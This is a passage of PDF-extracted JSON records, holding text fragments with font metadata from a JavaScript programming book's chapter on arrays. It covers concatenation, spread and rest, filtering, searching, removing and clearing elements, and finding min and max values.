        "text": "arrayToClone  =   [ 1 ,   2 ,   3 ,   4 ,   5 ]; clone1  =  Array. prototype . slice . call ( arrayToClone ); clone2  =   [] . slice . call ( arrayToClone );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.12: Concatenating Arrays",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Two Arrays",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array1  =   [ 1 ,   2 ]; var  array2  =   [ 3 ,   4 ,   5 ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 3",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  array3  =  array1. concat ( array2 );    // returns a new array",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  array3  =   [ ... array1 ,  ... array2 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in a new  Array :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   3 ,   4 ,   5 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Multiple Arrays",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array1  =   [ \"a\" ,   \"b\" ],     array2  =   [ \"c\" ,   \"d\" ],     array3  =   [ \"e\" ,   \"f\" ],     array4  =   [ \"g\" ,   \"h\" ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 96",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 3",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Provide more Array arguments to  array. concat ()",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arrConc  =  array1. concat ( array2 ,  array3 ,  array4 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Provide more arguments to  []",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arrConc  =   [ ... array1 ,  ... array2 ,  ... array3 ,  ... array4 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in a new  Array :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"a\" ,   \"b\" ,   \"c\" ,   \"d\" ,   \"e\" ,   \"f\" ,   \"g\" ,   \"h\" ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Without Copying the First Array",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  longArray  =   [ 1 ,   2 ,   3 ,   4 ,   5 ,   6 ,   7 ,   8 ],     shortArray  =   [ 9 ,   10 ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 3",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Provide the elements of  shortArray  as parameters to push using  Function. prototype . apply",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "longArray. push . apply ( longArray ,  shortArray );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Use the spread operator to pass the elements of  shortArray  as separate arguments to  push",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "longArray. push ( ... shortArray )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The value of  longArray  is now:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   3 ,   4 ,   5 ,   6 ,   7 ,   8 ,   9 ,   10 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that if the second array is too long (>100,000 entries), you may get a stack over\ufb02ow error (because of how apply  works). To be safe, you can iterate instead:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "shortArray. forEach ( function   ( elem )   {     longArray. push ( elem ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array and non-array values",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [ \"a\" ,   \"b\" ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 3",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  arrConc  =  array. concat ( \"c\" ,   \"d\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  arrConc  =   [ ... array ,   \"c\" ,   \"d\" ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in a new  Array :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"a\" ,   \"b\" ,   \"c\" ,   \"d\" ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can also mix arrays with non-arrays",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 97",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr1  =   [ \"a\" , \"b\" ]; var  arr2  =   [ \"e\" ,   \"f\" ]; var  arrConc  =  arr1. concat ( \"c\" ,   \"d\" ,  arr2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in a new  Array :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"a\" ,   \"b\" ,   \"c\" ,   \"d\" ,   \"e\" ,   \"f\" ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.13: Merge two array as key value pair",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When we have two separate array and we want to make key value pair from that two array, we can use array's reduce function like below:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  columns  =   [ \"Date\" ,   \"Number\" ,   \"Size\" ,   \"Location\" ,   \"Age\" ]; var  rows  =   [ \"2001\" ,   \"5\" ,   \"Big\" ,   \"Sydney\" ,   \"25\" ]; var  result  =   rows. reduce ( function ( result ,  field ,  index )   {   result [ columns [ index ]]   =  field ;    return  result ; },   {}) console. log ( result );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Output: {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  Date :   \"2001\" ,   Number :   \"5\" ,   Size :   \"Big\" ,   Location :   \"Sydney\" ,   Age :   \"25\" }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.14: Array spread / rest",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Spread operator",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "With ES6, you can use spreads to separate individual elements into a comma-separated syntax:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  arr  =   [ 1 ,   2 ,   3 ,  ... [ 4 ,   5 ,   6 ]];    // [1, 2, 3, 4, 5, 6]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// in ES < 6, the operations above are equivalent to",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "arr  =   [ 1 ,   2 ,   3 ]; arr. push ( 4 ,   5 ,   6 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The spread operator also acts upon strings, separating each individual character into a new string element. Therefore, using an array function for converting these into integers, the array created above is equivalent to the one below:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  arr  =   [ 1 ,   2 ,   3 ,  ... [ ... \"456\" ] . map ( x => parseInt ( x ))];   // [1, 2, 3, 4, 5, 6]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or, using a single string, this could be simpli\ufb01ed to:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  arr  =   [ ... \"123456\" ] . map ( x => parseInt ( x ));   // [1, 2, 3, 4, 5, 6]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 98",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If the mapping is not performed then:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  arr  =   [ ... \"123456\" ];   // [\"1\", \"2\", \"3\", \"4\", \"5\", \"6\"]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The spread operator can also be used to spread arguments into a function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  myFunction ( a ,  b ,  c )   {   } let  args  =   [ 0 ,   1 ,   2 ]; myFunction ( ... args );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// in ES < 6, this would be equivalent to:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myFunction. apply ( null ,  args );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Rest operator",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The rest operator does the opposite of the spread operator by coalescing several elements into a single one",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ a ,  b ,  ... rest ]   =   [ 1 ,   2 ,   3 ,   4 ,   5 ,   6 ];   // rest is assigned [3, 4, 5, 6]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Collect arguments of a function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  myFunction ( a ,  b ,  ... rest )   {  console. log ( rest );   } myFunction ( 0 ,   1 ,   2 ,   3 ,   4 ,   5 ,   6 );   // rest is [2, 3, 4, 5, 6]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.15: Filtering values",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  filter ()  method creates an array \ufb01lled with all array elements that pass a test provided as a function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   3 ,   4 ,   5 ] . filter ( function ( value ,  index ,  arr )   {    return  value  >   2 ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   3 ,   4 ,   5 ] . filter ( value  =>  value  >   2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in a new array:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 3 ,   4 ,   5 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Filter falsy values",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  filtered  =   [   0 ,   undefined ,   {},   null ,   '' ,   true ,   5 ] . filter ( Boolean );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Since Boolean is a native JavaScript function/constructor that takes [one optional parameter] and the \ufb01lter method also takes a function and passes it the current array item as parameter, you could read it like the following: Boolean ( 0 )  returns false 1. Boolean ( undefined )  returns false 2. Boolean ({})  returns  true  which means push it to the returned array 3. Boolean ( null )  returns false 4. Boolean ( '' )  returns false 5. Boolean ( true )  returns  true  which means push it to the returned array 6. 7.  Boolean ( 5 )  returns  true  which means push it to the returned array",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 99",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "so the overall process will result",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[   {},   true ,   5   ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Another simple example",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This example utilises the same concept of passing a function that takes one argument",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "function  startsWithLetterA ( str )   {      if ( str  &&  str [ 0 ] . toLowerCase ()   ==   'a' )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   true",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   false ; }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  str               =   'Since Boolean is a native javascript function/constructor that takes [one optional parameter] and the filter method also takes a function and passes it the current array item as a parameter, you could read it like the following' ; var  strArray          =  str. split ( \" \" ); var  wordsStartsWithA  =  strArray. filter ( startsWithLetterA );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//[\"a\", \"and\", \"also\", \"a\", \"and\", \"array\", \"as\"]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.16: Searching an Array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The recommended way (Since ES5) is to use  Array.prototype.\ufb01nd :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  people  =   [    {  name :   \"bob\"   },    {  name :   \"john\"   } ]; let  bob  =  people. find ( person  =>  person. name   ===   \"bob\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Or, more verbose",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  bob  =  people. find ( function ( person )   {    return  person. name   ===   \"bob\" ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In any version of JavaScript, a standard  for  loop can be used as well:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  i  =   0 ;  i  <  people. length ;  i ++)   {    if   ( people [ i ] . name   ===   \"bob\" )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     break ;   // we found bob    } }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "FindIndex",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The  \ufb01ndIndex()  method returns an index in the array, if an element in the array satis\ufb01es the provided testing function. Otherwise -1 is returned.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "array  =   [    {  value :   1   },    {  value :   2   },    {  value :   3   },    {  value :   4   },    {  value :   5   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 100 ];",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  index  =  array. findIndex ( item  =>  item. value   ===   3 );   // 2 var  index  =  array. findIndex ( item  =>  item. value   ===   12 );   // -1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.17: Convert a String to an Array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  . split ()  method splits a string into an array of substrings. By default  . split ()  will break the string into substrings on spaces ( \" \" ), which is equivalent to calling  . split ( \" \" ) . The parameter passed to  . split ()  speci\ufb01es the character, or the regular expression, to use for splitting the string. To split a string into an array call  . split  with an empty string ( \"\" ).  Important Note:  This only works if all of your characters \ufb01t in the Unicode lower range characters, which covers most English and most European languages. For languages that require 3 and 4 byte Unicode characters,  slice ( \"\" )  will separate them.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  strArray  =   \"StackOverflow\" . split ( \"\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// strArray = [\"S\", \"t\", \"a\", \"c\", \"k\", \"O\", \"v\", \"e\", \"r\", \"f\", \"l\", \"o\", \"w\"]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Using the spread operator ( ... ), to convert a  string  into an  array .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  strArray  =   [ ... \"sky is blue\" ];         ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// strArray = [\"s\", \"k\", \"y\", \" \", \"i\", \"s\", \" \", \"b\", \"l\", \"u\", \"e\"]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.18: Removing items from an array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Shift",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use  . shift  to remove the \ufb01rst item of an array. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [ 1 ,   2 ,   3 ,   4 ]; array. shift ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "array results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 2 ,   3 ,   4 ] Pop",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Further  . pop  is used to remove the last item from an array. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [ 1 ,   2 ,   3 ]; array. pop ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "array results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Both methods return the removed item;",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Splice",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 101",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use  . splice ()  to remove a series of elements from an array.  . splice ()  accepts two parameters, the starting index, and an optional number of elements to delete. If the second parameter is left out  . splice ()  will remove all elements from the starting index through the end of the array. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [ 1 ,   2 ,   3 ,   4 ]; array. splice ( 1 ,   2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "leaves  array  containing:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   4 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The return of  array. splice ()  is a new array containing the removed elements. For the example above, the return would be:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 2 ,   3 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Thus, omitting the second parameter e\ufb00ectively splits the array into two arrays, with the original ending before the index speci\ufb01ed:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [ 1 ,   2 ,   3 ,   4 ]; array. splice ( 2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "...leaves  array  containing  [ 1 ,   2 ]  and returns  [ 3 ,   4 ] .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Delete",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use  delete  to remove item from array without changing the length of array:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [ 1 ,   2 ,   3 ,   4 ,   5 ]; console. log ( array. length );   // 5 delete  array [ 2 ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( array );   // [1, 2, undefined, 4, 5]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( array. length );   // 5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array.prototype.length",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Assigning value to  length  of array changes the length to given value. If new value is less than array length items will be removed from the end of value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "array  =   [ 1 ,   2 ,   3 ,   4 ,   5 ]; array. length   =   2 ; console. log ( array );   // [1, 2]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.19: Removing all elements",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  arr  =   [ 1 ,   2 ,   3 ,   4 ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Method 1",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Creates a new array and overwrites the existing array reference with a new one.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "arr  =   [];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 102",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Care must be taken as this does not remove any items from the original array. The array may have been closed over when passed to a function. The array will remain in memory for the life of the function though you may not be aware of this. This is a common source of memory leaks. Example of a memory leak resulting from bad array clearing:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  count  =   0 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  addListener ( arr )   {   // arr is closed over",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  b  =  document. body . querySelector ( \"#foo\"   +   ( count ++));   b. addEventListener ( \"click\" ,   function ( e )   {   // this functions reference keeps",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // the closure current while the      // event is active      // do something but does not need arr      ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   }); } arr  =   [ \"big data\" ]; var  i  =   100 ; while  ( i  >   0 )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  addListener ( arr );   // the array is passed to the function   arr  =   [];   // only removes the reference, the original array remains",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  array. push ( \"some large data\" );   // more memory allocated   i --; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// there are now 100 arrays closed over, each referencing a different array // no a single item has been deleted",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To prevent the risk of a memory leak use the one of the following 2 methods to empty the array in the above example's while loop.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Method 2",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Setting the length property deletes all array element from the new array length to the old array length. It is the most e\ufb03cient way to remove and dereference all items in the array. Keeps the reference to the original array",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "arr. length   =   0 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Method 3",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Similar to method 2 but returns a new array containing the removed items. If you do not need the items this method is ine\ufb03cient as the new array is still created only to be immediately dereferenced.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "arr. splice ( 0 );   // should not use if you don't want the removed items // only use this method if you do the following var  keepArr  =  arr. splice ( 0 );   // empties the array and creates a new array containing the",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                              // removed items",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Related question .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.20: Finding the minimum or maximum element",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "If your array or array-like object is  numeric , that is, if all its elements are numbers, then you can use  Math. min . apply or  Math. max . apply  by passing  null  as the \ufb01rst argument, and your array as the second.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myArray  =   [ 1 ,   2 ,   3 ,   4 ]; Math. min . apply ( null ,  myArray );   // 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 103",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. max . apply ( null ,  myArray );   // 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "In ES6 you can use the  ...  operator to spread an array and take the minimum or maximum element.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myArray  =   [ 1 ,   2 ,   3 ,   4 ,   99 ,   20 ]; var  maxValue  =  Math. max ( ... myArray );   // 99 var  minValue  =  Math. min ( ... myArray );   // 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The following example uses a  for  loop:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  maxValue  =  myArray [ 0 ]; for ( var  i  =   1 ;  i  <  myArray. length ;  i ++)   {     var  currentValue  =  myArray [ i ];     if ( currentValue  >  maxValue )   {       maxValue  =  currentValue ;     } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "The following example uses  Array. prototype . reduce ()  to \ufb01nd the minimum or maximum:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myArray  =   [ 1 ,   2 ,   3 ,   4 ]; myArray. reduce ( function ( a ,  b )   {    return  Math. min ( a ,  b ); });   // 1 myArray. reduce ( function ( a ,  b )   {    return  Math. max ( a ,  b ); });   // 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "or using arrow functions:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "myArray. reduce (( a ,  b )   =>  Math. min ( a ,  b ));   // 1 myArray. reduce (( a ,  b )   =>  Math. max ( a ,  b ));   // 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
